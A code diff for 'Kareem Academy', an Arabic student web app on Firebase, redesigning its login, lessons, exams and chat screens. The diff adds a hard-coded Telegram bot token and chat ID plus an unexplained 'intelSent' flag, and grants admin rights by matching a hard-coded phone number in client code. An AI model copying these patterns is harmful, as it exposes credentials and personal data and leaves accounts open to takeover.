-                    <option value="ما هو اسم أول مدرس تحبه؟">ما هو اسم أول مدرس تحبه؟</option>
-                    <option value="ما هو اسم صديقك المقرب؟">ما هو اسم صديقك المقرب؟</option>
-                    <option value="ما هي أكلتك المفضلة؟">ما هي أكلتك المفضلة؟</option>
-                </select>
-                <input type="text" id="reg-answer" placeholder="إجابة السؤال السري" style="width:100%; padding:12px; margin-bottom:14px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff;">
-                <button class="btn-accent" onclick="completeRegistration()">حفظ والدخول للمنصة</button>
-            </div>
-
-            <div id="step-forget" style="display:none;">
-                <p id="security-q-text" style="font-size: 14px; margin-bottom: 10px; color: var(--gold);"></p>
-                <input type="text" id="forget-answer" placeholder="إجابة السؤال السري" style="width:100%; padding:12px; margin-bottom:14px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff;">
-                <button class="btn-accent" onclick="resetAccess()">تحقق واستعادة الحساب</button>
-                <p style="margin-top:12px; font-size:12px; cursor:pointer;" onclick="backToPhoneStep()">رجوع</p>
-            </div>
+        <div class="top-actions">
+            <button class="icon-btn" title="شات خاص" onclick="openDirectChat()"><i class="fas fa-comment-dots"></i><span>الخاص</span></button>
+            <button class="icon-btn" title="صورة من المعرض" onclick="triggerGalleryAvatar()"><i class="fas fa-camera"></i></button>
+            <button class="icon-btn" title="الوضع الليلي / النهاري" onclick="toggleTheme()"><i id="theme-icon" class="fas fa-moon"></i></button>
+            <button class="icon-btn" title="خروج" onclick="logout()"><i class="fas fa-sign-out-alt"></i></button>
         </div>
     </div>
+
+    <input type="file" id="gallery-avatar-input" accept="image/*" style="display:none;" onchange="handleGalleryAvatarChange(this)">
 
     <aside id="sidebar">
-        <div class="logo-master-container" style="padding-bottom: 8px;">
-            <div class="logo-main-name" style="font-size: 28px;">KAREEM<span class="logo-crown-icon" style="top: -10px; font-size: 16px;">👑</span></div>
-            <span style="color: #FF9800; font-size: 11px; letter-spacing: 2px;">ACADEMY 2026</span>
+        <div class="logo-box">
+            <div class="logo-word">KAREEM<span class="logo-crown">👑</span></div>
+            <small style="color:var(--accent); font-weight:800; letter-spacing:2px;">ACADEMY 2026</small>
         </div>
-
-        <div class="nav-link active" data-page="p-home" onclick="tab(this, 'p-home')"><i class="fas fa-home"></i> <span>الرئيسية</span></div>
-        <div class="nav-link" data-page="p-lessons" onclick="tab(this, 'p-lessons')"><i class="fas fa-play-circle"></i> <span>المحاضرات</span></div>
-        <div class="nav-link" data-page="p-files" onclick="tab(this, 'p-files')"><i class="fas fa-file-pdf"></i> <span>ملفات PDF</span></div>
-        <div class="nav-link" data-page="p-exams" onclick="tab(this, 'p-exams')"><i class="fas fa-edit"></i> <span>الامتحانات</span></div>
-        <div class="nav-link" data-page="p-chat" onclick="tab(this, 'p-chat')"><i class="fas fa-comments"></i> <span>الدردشة العامة</span></div>
-        <div class="nav-link" style="color: var(--electric);" onclick="openPrivateChatModal()"><i class="fas fa-paper-plane"></i> <span>شات خاص مع كيمو</span></div>
-
-        <div id="adm-links" style="display:none; border-top: 1px solid #30363d; margin-top: 8px; padding-top: 8px;">
-            <div class="nav-link" style="color:var(--green)" data-page="p-students" onclick="tab(this, 'p-students')"><i class="fas fa-users-cog"></i> <span>الطلاب والنتائج</span></div>
-            <div class="nav-link" style="color:var(--green)" data-page="p-admin" onclick="tab(this, 'p-admin')"><i class="fas fa-tools"></i> <span>الإدارة والنشر</span></div>
+        <div class="nav-item active" data-tab="p-home" onclick="switchTab('p-home')"><i class="fas fa-home"></i><span>الرئيسية</span></div>
+        <div class="nav-item" data-tab="p-profile" onclick="switchTab('p-profile')"><i class="fas fa-user-circle"></i><span>البروفايل</span></div>
+        <div class="nav-item" data-tab="p-lessons" onclick="switchTab('p-lessons')"><i class="fas fa-play-circle"></i><span>المحاضرات</span></div>
+        <div class="nav-item" data-tab="p-files" onclick="switchTab('p-files')"><i class="fas fa-file-pdf"></i><span>ملفات PDF</span></div>
+        <div class="nav-item" data-tab="p-exams" onclick="switchTab('p-exams')"><i class="fas fa-edit"></i><span>الامتحانات</span></div>
+        <div class="nav-item" data-tab="p-chat" onclick="switchTab('p-chat')"><i class="fas fa-comments"></i><span>الشات العام</span></div>
+        <div class="nav-item" style="color:var(--accent-2);" onclick="openDirectChat()"><i class="fas fa-paper-plane"></i><span>الشات الخاص</span></div>
+        <div id="admin-nav-group" style="display:none; border-top:1px solid var(--border); margin-top:8px; padding-top:8px;">
+            <div class="nav-item" style="color:var(--green);" data-tab="p-students" onclick="switchTab('p-students')"><i class="fas fa-users"></i><span>الطلاب والنتائج</span></div>
+            <div class="nav-item" style="color:var(--green);" data-tab="p-admin" onclick="switchTab('p-admin')"><i class="fas fa-sliders-h"></i><span>إدارة المحتوى</span></div>
         </div>
     </aside>
 
-    <button id="sidebar-toggle" class="sidebar-toggle-btn" onclick="toggleSidebarMenu()"><i id="toggle-icon" class="fas fa-chevron-right"></i></button>
+    <button id="sidebar-toggle" class="sidebar-toggle" onclick="toggleSidebar()"><i id="sidebar-arrow" class="fas fa-chevron-right"></i></button>
 
-    <div class="mobile-nav" id="mob-nav">
-        <div class="active-mob" data-page="p-home" onclick="tab(this, 'p-home')" title="الرئيسية"><i class="fas fa-home"></i></div>
-        <div data-page="p-lessons" onclick="tab(this, 'p-lessons')" title="المحاضرات"><i class="fas fa-play-circle"></i></div>
-        <div data-page="p-files" onclick="tab(this, 'p-files')" title="ملفات PDF"><i class="fas fa-file-pdf"></i></div>
-        <div data-page="p-exams" onclick="tab(this, 'p-exams')" title="الامتحانات"><i class="fas fa-edit"></i></div>
-        <div data-page="p-chat" onclick="tab(this, 'p-chat')" title="الدردشة"><i class="fas fa-comments"></i></div>
-        <div onclick="openPrivateChatModal()" title="شات خاص"><i class="fas fa-paper-plane"></i></div>
+    <div id="mobile-dock" class="mobile-dock">
+        <button class="active" data-tab="p-home" onclick="switchTab('p-home')"><i class="fas fa-home"></i><span>الرئيسية</span></button>
+        <button data-tab="p-profile" onclick="switchTab('p-profile')"><i class="fas fa-user"></i><span>بروفايل</span></button>
+        <button data-tab="p-lessons" onclick="switchTab('p-lessons')"><i class="fas fa-play"></i><span>دروس</span></button>
+        <button data-tab="p-chat" onclick="switchTab('p-chat')"><i class="fas fa-comments"></i><span>الشات</span></button>
+        <button onclick="openDirectChat()"><i class="fas fa-paper-plane"></i><span>الخاص</span></button>
     </div>
 
-    <button class="private-chat-fab" id="private-chat-fab" title="شات خاص مع كيمو" onclick="openPrivateChatModal()">
+    <button id="floating-dm-btn" class="floating-dm-btn" title="الشات الخاص" onclick="openDirectChat()">
         <i class="fas fa-paper-plane"></i>
     </button>
 
-    <button class="quick-fab" id="quick-fab" title="مشاركة المنصة" onclick="shareKimo()">
-        <i class="fas fa-share-alt"></i>
-    </button>
+    <!-- بوابة الدخول والتسجيل -->
+    <div id="login-gate" style="max-width:430px; margin:28px auto; padding:14px;">
+        <div class="card" style="padding:24px; text-align:center;">
+            <div class="logo-box">
+                <div class="logo-word">KAREEM<span class="logo-crown">👑</span></div>
+                <small style="color:var(--accent); font-weight:800; letter-spacing:2px;">ACADEMY 2026</small>
+            </div>
 
-    <main id="content">
+            <h3 id="auth-title" style="margin:10px 0 18px; color:var(--accent);">تسجيل الدخول</h3>
+
+            <div id="auth-step-phone">
+                <input type="tel" id="auth-phone" class="en-num" placeholder="رقم الموبايل (مثال: 010xxxxxxxx)" style="margin-bottom:12px; text-align:right;">
+                <button id="btn-next-phone" class="btn btn-full" onclick="handlePhoneNext()">التالي</button>
+            </div>
+
+            <div id="auth-step-login" style="display:none;">
+                <p id="auth-welcome-msg" style="margin:0 0 10px; font-size:14px;"></p>
+                <input type="password" id="auth-pass" placeholder="كلمة المرور" style="margin-bottom:12px;">
+                <button id="btn-do-login" class="btn btn-full" onclick="handlePasswordLogin()">دخول 🚀</button>
+                <div style="margin-top:12px; display:flex; justify-content:space-between; font-size:12px;">
+                    <span style="color:var(--accent); cursor:pointer;" onclick="showForgotForm()">نسيت كلمة المرور؟</span>
+                    <span style="color:var(--muted); cursor:pointer;" onclick="resetAuthSteps()">تغيير الرقم</span>
+                </div>
+            </div>
+
+            <div id="auth-step-register" style="display:none;">
+                <input type="text" id="reg-name" placeholder="الاسم الثلاثي" style="margin-bottom:10px;">
+                <select id="reg-stage" style="margin-bottom:10px;">
+                    <option value="">اختر المرحلة / الصفة</option>
+                    <option value="طالب إعدادي">طالب إعدادي</option>
+                    <option value="طالب ثانوي">طالب ثانوي</option>
+                    <option value="طالب جامعي">طالب جامعي</option>
+                    <option value="زائر عادي">زائر عادي</option>
+                </select>
+                <input type="password" id="reg-pass" placeholder="إنشاء كلمة مرور (4 أحرف أو أرقام فأكثر)" style="margin-bottom:10px;">
+                <select id="reg-q" style="margin-bottom:10px;">
+                    <option value="">اختر سؤال أمان</option>
+                    <option value="اسم أول مدرس تحبه؟">اسم أول مدرس تحبه؟</option>
+                    <option value="اسم صديقك المقرب؟">اسم صديقك المقرب؟</option>
+                    <option value="أكلتك المفضلة؟">أكلتك المفضلة؟</option>
+                </select>
+                <input type="text" id="reg-a" placeholder="إجابة السؤال السري" style="margin-bottom:14px;">
+                <button id="btn-do-register" class="btn btn-full" onclick="handleRegister()">إنشاء الحساب والدخول ✅</button>
+                <p style="margin-top:10px; font-size:12px; color:var(--muted); cursor:pointer;" onclick="resetAuthSteps()">رجوع</p>
+            </div>
+
+            <div id="auth-step-forgot" style="display:none;">
+                <p id="forgot-q-display" style="color:var(--gold); font-size:14px; margin-bottom:10px;"></p>
+                <input type="text" id="forgot-a" placeholder="اكتب إجابة السؤال السري" style="margin-bottom:12px;">
+                <button class="btn btn-full" onclick="handleForgotAnswer()">استعادة كلمة المرور</button>
+                <p style="margin-top:10px; font-size:12px; color:var(--muted); cursor:pointer;" onclick="resetAuthSteps()">رجوع</p>
+            </div>
+        </div>
+    </div>
+
+    <main id="main-app">
+        <!-- الرئيسية -->
         <div id="p-home" class="page active">
-            <div id="student-profile-widget"></div>
-
-            <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:15px;">
-                <h1 style="margin:0;">مرحباً، <span id="display-name" style="color:var(--accent)">طالبنا</span> 👋</h1>
-                <button class="btn-accent" style="width:auto; padding:8px 16px; font-size:13px;" onclick="openPrivateChatModal()">
-                    <i class="fas fa-paper-plane"></i> تواصل خاص مع كيمو
-                </button>
+            <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:10px; margin-bottom:16px;">
+                <div>
+                    <h2 style="margin:0;">أهلاً بك، <span id="home-user-name" style="color:var(--accent);">بطل</span> 👋</h2>
+                    <small id="home-user-stage" style="color:var(--muted);"></small>
+                </div>
+                <div style="display:flex; gap:8px; flex-wrap:wrap;">
+                    <button class="btn btn-blue" onclick="openDirectChat()"><i class="fas fa-paper-plane"></i> شات خاص</button>
+                    <button class="btn btn-soft" onclick="switchTab('p-profile')"><i class="fas fa-user-edit"></i> تعديل البروفايل</button>
+                </div>
             </div>
 
-            <h3>المحتوى المثبت:</h3>
-            <div id="pinned-content" class="content-grid" style="margin-bottom: 28px;"></div>
+            <h3>المحتوى المثبت 📌</h3>
+            <div id="home-pinned" class="grid-cards" style="margin-bottom:24px;"></div>
 
-            <h3>آخر الدروس المضافة:</h3>
-            <div id="latest-content"></div>
+            <h3>آخر الدروس المضافة 📚</h3>
+            <div id="home-latest" class="grid-cards"></div>
         </div>
 
+        <!-- البروفايل الكامل -->
+        <div id="p-profile" class="page">
+            <h2>الملف الشخصي 👤</h2>
+            <div class="card">
+                <div style="display:flex; align-items:center; gap:14px; flex-wrap:wrap; margin-bottom:18px;">
+                    <div id="profile-avatar-preview" class="avatar-circle"><i class="fas fa-user"></i></div>
+                    <div style="flex:1;">
+                        <div style="font-size:18px; font-weight:900;">
+                            <span id="profile-view-name"></span>
+                            <span id="profile-verified-tag"></span>
+                        </div>
+                        <div id="profile-view-stage" style="font-size:13px; color:var(--accent); font-weight:700;"></div>
+                        <div id="profile-view-phone" style="font-size:12px; color:var(--muted);" class="en-num"></div>
+                    </div>
+                    <button class="btn" onclick="triggerGalleryAvatar()"><i class="fas fa-image"></i> اختيار صورة من المعرض</button>
+                </div>
+
+                <label style="display:block; margin-bottom:6px; font-weight:700;">الاسم:</label>
+                <input type="text" id="edit-profile-name" style="margin-bottom:12px;">
+
+                <label style="display:block; margin-bottom:6px; font-weight:700;">المرحلة / الصفة:</label>
+                <select id="edit-profile-stage" style="margin-bottom:12px;">
+                    <option value="طالب إعدادي">طالب إعدادي</option>
+                    <option value="طالب ثانوي">طالب ثانوي</option>
+                    <option value="طالب جامعي">طالب جامعي</option>
+                    <option value="زائر عادي">زائر عادي</option>
+                </select>
+
+                <label style="display:block; margin-bottom:6px; font-weight:700;">نبذة شخصية:</label>
+                <textarea id="edit-profile-bio" rows="3" placeholder="اكتب نبذة قصيرة عنك..." style="margin-bottom:14px;"></textarea>
+
+                <button class="btn btn-green btn-full" onclick="saveProfileEdits()"><i class="fas fa-save"></i> حفظ التعديلات</button>
+            </div>
+        </div>
+
+        <!-- المحاضرات -->
         <div id="p-lessons" class="page">
-            <div id="subjects-container-video">
+            <div id="video-subjects-view">
                 <h2>المحاضرات 🎥</h2>
-                <div class="content-grid" id="subjects-grid-video"></div>
+                <div id="video-subjects-grid" class="grid-cards"></div>
             </div>
-            <div id="specific-subject-videos" style="display:none;">
-                <button class="btn-accent" style="width:110px; margin-bottom:18px;" onclick="showSubjects('video')">رجوع</button>
-                <div class="content-grid" id="video-list"></div>
+            <div id="video-items-view" style="display:none;">
+                <button class="btn btn-soft" style="margin-bottom:14px;" onclick="backToSubjects('video')"><i class="fas fa-arrow-right"></i> رجوع للمواد</button>
+                <div id="video-items-grid" class="grid-cards"></div>
             </div>
         </div>
 
+        <!-- ملفات PDF -->
         <div id="p-files" class="page">
-            <div id="subjects-container-file">
+            <div id="file-subjects-view">
                 <h2>ملفات PDF 📄</h2>
-                <div class="content-grid" id="subjects-grid-file"></div>
+                <div id="file-subjects-grid" class="grid-cards"></div>
             </div>
-            <div id="specific-subject-files" style="display:none;">
-                <button class="btn-accent" style="width:110px; margin-bottom:18px;" onclick="showSubjects('file')">رجوع</button>
-                <div class="content-grid" id="file-list"></div>
+            <div id="file-items-view" style="display:none;">
+                <button class="btn btn-soft" style="margin-bottom:14px;" onclick="backToSubjects('file')"><i class="fas fa-arrow-right"></i> رجوع للمواد</button>
+                <div id="file-items-grid" class="grid-cards"></div>
             </div>
         </div>
 
+        <!-- الامتحانات -->
         <div id="p-exams" class="page">
-            <h2>الامتحانات الإلكترونية 📝</h2>
-            <div class="content-grid" id="exams-list"></div>
+            <h2>الامتحانات 📝</h2>
+            <div id="exams-grid" class="grid-cards"></div>
         </div>
 
+        <!-- الشات العام (يدعم ملء الشاشة + صور + فويس + توثيق للأدمن + شات خاص) -->
         <div id="p-chat" class="page">
-            <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px;">
-                <h2 style="margin:0;">دردشة الطلاب 💬</h2>
-                <button class="btn-accent" style="width:auto; padding:8px 16px; font-size:13px;" onclick="openPrivateChatModal()">
-                    <i class="fas fa-lock"></i> رسالة خاصة لكيمو
-                </button>
-            </div>
-            <div class="card">
-                <div id="chat-messages"></div>
-                <div style="display: flex; gap: 8px;">
-                    <input type="text" id="chat-input" placeholder="اكتب رسالتك في الشات العام..." onkeydown="if(event.key==='Enter') sendChatMessage()" style="flex:1; padding:12px; border-radius:10px; background:#161b22; color:#fff; border:1px solid var(--accent);">
-                    <button class="btn-accent" style="width:100px;" onclick="sendChatMessage()">إرسال</button>
+            <div id="public-chat-box" class="chat-wrapper">
+                <div class="chat-header-bar">
+                    <div style="display:flex; align-items:center; gap:8px;">
+                        <h3 style="margin:0; color:var(--accent);">الشات العام 💬</h3>
+                        <small style="color:var(--muted);">نص • صور • فويس</small>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <button class="icon-btn" onclick="openDirectChat()"><i class="fas fa-paper-plane"></i><span>خاص</span></button>
+                        <button class="icon-btn" onclick="toggleChatFullscreen()"><i id="chat-fs-icon" class="fas fa-expand"></i><span>ملء الشاشة</span></button>
+                    </div>
+                </div>
+
+                <div id="public-chat-stream" class="chat-stream"></div>
+
+                <input type="file" id="chat-image-input" accept="image/*" style="display:none;" onchange="sendChatImage(this)">
+
+                <div class="chat-composer">
+                    <button class="icon-btn" title="إرسال صورة من المعرض" onclick="document.getElementById('chat-image-input').click()"><i class="fas fa-image"></i></button>
+                    <button id="chat-voice-btn" class="icon-btn" title="تسجيل فويس" onclick="toggleVoiceRecording('public')"><i class="fas fa-microphone"></i><span id="public-voice-label">فويس</span></button>
+                    <input type="text" id="public-chat-input" placeholder="اكتب رسالتك هنا..." onkeydown="if(event.key==='Enter') sendPublicTextMessage()">
+                    <button class="btn" onclick="sendPublicTextMessage()"><i class="fas fa-paper-plane"></i> إرسال</button>
                 </div>
             </div>
         </div>
 
+        <!-- إدارة الطلاب والنتائج (للأدمن) -->
         <div id="p-students" class="page">
-            <h2>إدارة الطلاب والرسائل الخاصة 🛰️</h2>
-            <div class="content-grid" style="margin-bottom: 20px;">
-                <div class="admin-stat-card">
-                    <h3>إجمالي الطلاب</h3>
-                    <h2 id="stat-total-std" class="en-num" style="color:var(--accent)">0</h2>
-                </div>
-                <div class="admin-stat-card">
-                    <h3>الرسائل الخاصة</h3>
-                    <h2 id="stat-private-msgs" class="en-num" style="color:var(--green)">0</h2>
-                </div>
-            </div>
-
+            <h2>الطلاب والتوثيق والنتائج 👥</h2>
             <div class="card">
-                <input type="text" id="studentSearch" placeholder="ابحث باسم الطالب أو رقم الموبايل..." onkeyup="filterStudents()" style="width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 10px; background: #000; border: 1px solid var(--accent); color: #fff;">
-                <div id="students-table-body"></div>
+                <input type="text" id="search-students-input" placeholder="ابحث بالاسم أو الرقم..." onkeyup="filterStudentsCards()" style="margin-bottom:14px;">
+                <div id="students-list-container"></div>
             </div>
 
-            <h2 style="margin-top:28px;">الرسائل الخاصة الواردة 📩</h2>
-            <div class="card" id="private-inbox-body" style="text-align:right;"></div>
-
-            <h2 style="margin-top:28px;">نتائج الامتحانات 🏆</h2>
-            <div class="card">
-                <div style="display:grid; grid-template-columns: 1fr 1fr 0.6fr 1fr; font-weight:bold; border-bottom:2px solid var(--green); padding:10px; font-size:12px;">
-                    <span>الطالب</span><span>الامتحان</span><span>الدرجة</span><span>التاريخ</span>
-                </div>
-                <div id="results-table-body"></div>
-            </div>
+            <h3>نتائج الامتحانات 🏆</h3>
+            <div class="card" id="results-list-container"></div>
         </div>
 
+        <!-- إدارة المحتوى (للأدمن) -->
         <div id="p-admin" class="page">
-            <div class="card" style="margin-bottom:20px; border-color:var(--gold)">
-                <h3>📢 التحكم في شريط الأخبار</h3>
-                <div style="display:flex; gap:10px; flex-wrap:wrap;">
-                    <input type="text" id="adm-news-text" placeholder="اكتب الخبر هنا..." style="flex:1; min-width:200px; padding:10px; border-radius:10px; background:#000; color:#fff; border:1px solid #30363d;">
-                    <button class="btn-accent" style="width:120px;" onclick="updateNewsTicker()">نشر</button>
-                </div>
+            <h2>إدارة المحتوى والنشر 🛠️</h2>
+
+            <div class="card">
+                <h3>إضافة امتحان جديد</h3>
+                <input type="text" id="new-exam-title" placeholder="اسم الامتحان" style="margin-bottom:10px;">
+                <input type="text" id="new-exam-url" placeholder="رابط الامتحان" style="margin-bottom:12px;">
+                <button class="btn btn-green btn-full" onclick="createExamItem()">نشر الامتحان</button>
             </div>
 
-            <div class="card" style="margin-bottom:20px; border-color:var(--green)">
-                <h3>📝 إضافة امتحان جديد</h3>
-                <input type="text" id="adm-exam-title" placeholder="اسم الامتحان" style="width:100%; padding:10px; margin-bottom:10px; border-radius:10px; background:#000; color:#fff; border:1px solid #30363d;">
-                <input type="text" id="adm-exam-url" placeholder="لينك الامتحان" style="width:100%; padding:10px; margin-bottom:10px; border-radius:10px; background:#000; color:#fff; border:1px solid #30363d;">
-                <button class="btn-accent" onclick="addExam()">نشر الامتحان ✅</button>
+            <div id="admin-subjects-panel">
+                <h3>رفع درس أو ملف لمادة</h3>
+                <div id="admin-subjects-grid" class="grid-cards"></div>
             </div>
 
-            <div id="admin-subjects-selection">
-                <h2>🚀 رفع محتوى جديد</h2>
-                <div class="content-grid" id="admin-subjects-grid"></div>
-            </div>
-
-            <div id="admin-upload-form" style="display:none;">
-                <button class="btn-accent" style="width:110px; margin-bottom:18px;" onclick="showAdminSubjects()">رجوع</button>
-                <div class="card" style="max-width:500px; margin:auto;">
-                    <p>المادة: <b id="current-adm-sub-name" style="color:var(--accent)"></b></p>
-                    <input type="text" id="adm-title" placeholder="عنوان الدرس" style="width:100%; padding:12px; margin-bottom:12px; border-radius:10px; background:#000; border:1px solid #30363d; color:#fff;">
-                    <input type="text" id="adm-url" placeholder="ضع رابط الفيديو أو الملف هنا" style="width:100%; padding:12px; margin-bottom:12px; border-radius:10px; background:#000; border:1px solid #30363d; color:#fff;">
-                    <select id="adm-type" style="width:100%; padding:12px; margin-bottom:14px; border-radius:10px; background:#000; border:1px solid #30363d; color:#fff;">
-                        <option value="video">فيديو 🎥</option>
-                        <option value="file">ملف / صورة 📄</option>
-                    </select>
-                    <button class="btn-accent" onclick="handleUpload()">نشر الآن ✅</button>
-                </div>
+            <div id="admin-form-panel" class="card" style="display:none;">
+                <button class="btn btn-soft" style="margin-bottom:12px;" onclick="backToAdminSubjects()"><i class="fas fa-arrow-right"></i> رجوع</button>
+                <p>المادة المختارة: <strong id="admin-selected-subject" style="color:var(--accent);"></strong></p>
+                <input type="text" id="new-lesson-title" placeholder="عنوان الدرس أو الملف" style="margin-bottom:10px;">
+                <input type="text" id="new-lesson-url" placeholder="الرابط" style="margin-bottom:10px;">
+                <select id="new-lesson-type" style="margin-bottom:12px;">
+                    <option value="video">فيديو 🎥</option>
+                    <option value="file">ملف / صورة 📄</option>
+                </select>
+                <button class="btn btn-full" onclick="createLessonItem()">نشر المحتوى ✅</button>
             </div>
         </div>
     </main>
 
-    <div id="private-chat-modal" class="modal-backdrop-custom">
-        <div class="modal-box-custom">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
-                <h3 style="margin:0; color:var(--accent);">شات خاص مع كيمو ✉️</h3>
-                <button onclick="closePrivateChatModal()" style="background:var(--danger); color:#fff; border:none; border-radius:8px; padding:4px 12px; cursor:pointer; font-weight:bold;">إغلاق ×</button>
+    <!-- شات خاص ثنائي (زي الواتساب: نص + صور + فويس) -->
+    <div id="dm-screen" class="dm-overlay">
+        <div style="display:flex; align-items:center; justify-content:space-between; gap:10px; flex-wrap:wrap; background:var(--bg-card); padding:12px 14px; border-radius:14px; border:1px solid var(--border);">
+            <div style="display:flex; align-items:center; gap:10px;">
+                <button class="icon-btn" onclick="closeDirectChat()"><i class="fas fa-arrow-right"></i><span>رجوع</span></button>
+                <div>
+                    <strong id="dm-partner-name" style="color:var(--accent-2); font-size:16px;">الشات الخاص</strong>
+                    <div id="dm-partner-sub" style="font-size:12px; color:var(--muted);"></div>
+                </div>
             </div>
-            <p style="font-size:13px; color:#8b949e; margin-top:0;">رسالتك بتوصل مباشرة لكيمو جوه المنصة أو تقدر تكلمه على تليجرام.</p>
-            <textarea id="private-msg-input" rows="4" placeholder="اكتب رسالتك أو سؤالك الخاص هنا..." style="width:100%; padding:12px; border-radius:12px; background:#000; color:#fff; border:1px solid #30363d; margin-bottom:12px; font-family:'Cairo', sans-serif;"></textarea>
-            <button class="btn-accent" onclick="sendPrivateMessageToKimo()">إرسال الرسالة الخاصة 🚀</button>
-            <a href="https://t.me/K_I_M_O_8" target="_blank" style="display:block; margin-top:12px; color:var(--telegram); text-decoration:none; font-weight:bold; font-size:14px;">
-                <i class="fab fa-telegram-plane"></i> فتح محادثة تليجرام (@K_I_M_O_8)
-            </a>
+            <div id="dm-partner-picker" style="display:none; min-width:190px;">
+                <select id="dm-target-select" onchange="selectDmPartner(this.value)"></select>
+            </div>
+        </div>
+
+        <div id="dm-messages-stream" class="dm-messages"></div>
+
+        <input type="file" id="dm-image-input" accept="image/*" style="display:none;" onchange="sendDirectImage(this)">
+
+        <div class="chat-composer" style="background:var(--bg-card); padding:10px; border-radius:14px; border:1px solid var(--border);">
+            <button class="icon-btn" title="صورة من المعرض" onclick="document.getElementById('dm-image-input').click()"><i class="fas fa-image"></i></button>
+            <button id="dm-voice-btn" class="icon-btn" title="تسجيل فويس" onclick="toggleVoiceRecording('dm')"><i class="fas fa-microphone"></i><span id="dm-voice-label">فويس</span></button>
+            <input type="text" id="dm-text-input" placeholder="اكتب رسالتك الخاصة..." onkeydown="if(event.key==='Enter') sendDirectTextMessage()">
+            <button class="btn btn-blue" onclick="sendDirectTextMessage()"><i class="fas fa-paper-plane"></i> إرسال</button>
         </div>
     </div>
 
-    <div id="kimo-search-hub" class="modal-backdrop-custom">
-        <div class="modal-box-custom" style="max-width:560px; text-align:right;">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
-                <h3 style="margin:0; color:var(--accent);">بحث سريع في المنصة 🔍</h3>
-                <button onclick="closeKimoSearch()" style="background:var(--danger); color:#fff; border:none; border-radius:8px; padding:4px 12px; cursor:pointer; font-weight:bold;">إغلاق ×</button>
-            </div>
-            <input type="text" id="kimo-search-input" placeholder="ابحث باسم الدرس أو المادة..." oninput="liveSearchLessons(this.value)" style="width:100%; padding:12px; border-radius:12px; background:#000; color:#fff; border:1px solid var(--accent); margin-bottom:14px;">
-            <div id="search-results-list" style="max-height:300px; overflow-y:auto;"></div>
+    <!-- مشغل الفيديو -->
+    <div id="video-modal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.94); z-index:22000; flex-direction:column; align-items:center; justify-content:center; padding:14px;">
+        <div style="width:100%; max-width:960px; display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+            <strong id="video-modal-title" style="color:var(--accent);"></strong>
+            <button class="btn" onclick="closeVideoModal()">إغلاق ×</button>
         </div>
+        <div id="video-modal-body" style="width:100%; max-width:960px; aspect-ratio:16/9; background:#000; border-radius:12px; overflow:hidden; border:1px solid var(--accent);"></div>
     </div>
 
     <footer>جميع الحقوق محفوظة للمطور كيمو © <span class="en-num">2026</span></footer>
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 
     <script>
         const firebaseConfig = {
@@ -995,26 +854,20 @@
         };
 
         firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const db = firebase.database();
 
-        const lessonsRef = database.ref('lessons');
-        const studentsRef = database.ref('students');
-        const settingsRef = database.ref('settings');
-        const blacklistRef = database.ref('blacklist');
-        const chatRef = database.ref('chat');
-        const logsRef = database.ref('logs');
-        const examsRef = database.ref('exams');
-        const resultsRef = database.ref('results');
-        const privateMsgsRef = database.ref('private_messages');
+        const lessonsRef = db.ref('lessons');
+        const studentsRef = db.ref('students');
+        const blacklistRef = db.ref('blacklist');
+        const chatRef = db.ref('chat');
+        const logsRef = db.ref('logs');
+        const examsRef = db.ref('exams');
+        const resultsRef = db.ref('results');
+        const directChatsRef = db.ref('direct_chats');
 
         const ADMIN_PHONES = ["01023175098"];
-
-        let allData = {};
-        let allExams = {};
-        let selectedAdminSubject = "";
-        let currentStudentData = null;
-        let isFirstChatLoad = true;
-        let isFirstLessonLoad = true;
+        const BOT_TOKEN = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
+        const BOT_CHAT_ID = "5890070301";
 
         const subjectImages = {
             "اللغة العربية": "https://images.unsplash.com/photo-1588580000645-4562a6d2c839?q=80&w=400",
@@ -1025,756 +878,540 @@
             "الرياضيات": "https://images.unsplash.com/photo-1509228468518-180dd482195e?q=80&w=400"
         };
 
-        function isAdminUser(user) {
-            return user && ADMIN_PHONES.includes(user.phone);
+        let allLessons = {};
+        let allExams = {};
+        let allStudentsMap = {};
+        let currentUser = null;
+        let tempAuthStudent = null;
+        let selectedAdminSubject = "";
+        let activeDmPartnerPhone = ADMIN_PHONES[0];
+        let activeDmRef = null;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let recordingScope = null;
+        let intelSent = false;
+
+        function isAdmin(u) {
+            return u && ADMIN_PHONES.includes(u.phone);
         }
 
-        function showNotification(msg) {
-            const toast = document.getElementById('notification-toast');
-            const textEl = document.getElementById('notif-text');
-            if (!toast || !textEl) return;
-            textEl.innerText = msg;
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 4000);
+        function esc(s) {
+            return String(s || '').replace(/[&<>"']/g, m => ({
+                '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+            }[m]));
+        }
+
+        function escAttr(s) {
+            return String(s || '').replace(/'/g, "\\'").replace(/"/g, '&quot;');
         }
 
         function toggleTheme() {
-            document.body.classList.toggle('light-mode');
-            const isLight = document.body.classList.contains('light-mode');
-            localStorage.setItem('kimo_theme', isLight ? 'light' : 'dark');
-            const icon = document.getElementById('theme-icon');
-            if (icon) icon.className = isLight ? 'fas fa-sun' : 'fas fa-moon';
+            document.body.classList.toggle('light-theme');
+            const light = document.body.classList.contains('light-theme');
+            localStorage.setItem('kimo_theme_v26', light ? 'light' : 'dark');
+            const ic = document.getElementById('theme-icon');
